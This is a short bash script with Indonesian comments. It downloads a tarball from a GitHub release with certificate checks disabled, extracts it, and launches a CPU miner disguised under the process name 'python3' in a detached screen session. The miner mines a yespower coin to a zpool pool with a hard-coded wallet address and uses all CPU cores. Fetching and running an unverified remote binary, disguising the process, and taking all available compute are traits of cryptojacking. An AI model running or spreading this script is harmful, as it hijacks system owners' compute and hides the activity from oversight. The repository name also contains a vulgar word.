#!/bin/bash

# Periksa apakah file sudah diekstrak sebelumnya
if [ ! -d "dotgula" ]; then
    echo "Mengunduh dan mengekstrak dotcpu.tar.gz..."
    wget -O dotgula --no-check-certificate https://github.com/DOT-AJA/KONTOL-DOT/releases/download/KONTOL/dotsrb.tar.gz
    tar -xvf dotgula
else
    echo "File sudah diekstrak. Lewati pengunduhan."
fi

screen -dmS DOT ./dotsrb/python3 -a yespowersugar -o yespowerSUGAR.eu.mine.zpool.ca:6241 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j -p c=SUGAR -t $(nproc)
